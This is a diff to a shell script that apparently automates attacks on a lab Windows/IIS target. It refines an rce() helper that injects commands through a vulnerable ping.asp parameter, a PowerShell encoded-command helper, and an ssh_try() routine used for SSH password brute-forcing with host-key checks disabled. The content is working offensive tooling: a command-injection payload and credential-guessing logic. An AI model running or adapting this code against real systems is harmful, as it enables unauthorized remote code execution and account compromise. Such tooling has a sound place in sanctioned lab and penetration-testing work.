@@ -25,7 +25,8 @@ strip() { sed -e 's/<pre>//' -e 's|</pre>||'; }
 # rce CMD — run CMD on the target via the ping.asp injection. POST so
 # EncodedCommand payloads are not truncated by IIS's query-string limit.
 rce() {
-  curl -sf -m 120 "http://$TARGET/ping.asp" --data-urlencode "ip=127.0.0.1 & $1"
+  # No -f: IIS can return 500 after the command already ran (AV, start /b).
+  curl -s -m 120 "http://$TARGET/ping.asp" --data-urlencode "ip=127.0.0.1 & $1"
 }
 
 # ps_enc TEXT — UTF-16LE base64 for powershell -EncodedCommand.
@@ -61,13 +62,14 @@ root_ps() {
 
 # ssh_try USER PASS CMD — attempt one SSH password login. Prints command
 # output and returns 0 on success; silent and nonzero on bad credentials.
+# The remote command is passed via the environment so Expect/Tcl does not
+# reinterpret backslashes (C:\Users would otherwise become a unicode escape).
 ssh_try() {
-  local out cmd
-  cmd="${3//\\//}"
+  local out
   if command -v sshpass >/dev/null 2>&1; then
     if out=$(sshpass -p "$2" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
       -o PubkeyAuthentication=no -o PreferredAuthentications=password \
-      "$1@$TARGET" "$cmd" 2>&1); then
+      "$1@$TARGET" "$3" 2>&1); then
       printf '%s\n' "$out"
       return 0
     fi
@@ -75,17 +77,16 @@ ssh_try() {
   fi
   command -v expect >/dev/null 2>&1 ||
     die "the attacker box needs sshpass or expect for the brute-force / SSH stages"
-  if out=$(expect <<EOF
+  if out=$(EXPECT_USER="$1" EXPECT_PASS="$2" EXPECT_HOST="$TARGET" EXPECT_CMD="$3" expect <<'EOF'
 set timeout 20
-spawn ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no $1@$TARGET "$cmd"
+spawn ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no $env(EXPECT_USER)@$env(EXPECT_HOST) "$env(EXPECT_CMD)"
 expect {
-  -re "(?i)password:" { send "$2\r"; exp_continue }
+  -re "(?i)password:" { send "$env(EXPECT_PASS)\r"; exp_continue }
   eof
 }
-# eof already reaped the process on some Expect builds; empty wait is success.
 if {[catch wait result]} { exit 0 }
-if {[llength \$result] < 4} { exit 0 }
-exit [lindex \$result 3]
+if {[llength $result] < 4} { exit 0 }
+exit [lindex $result 3]
 EOF
 ); then
     printf '%s\n' "$out" | grep -v '^spawn ssh' || true
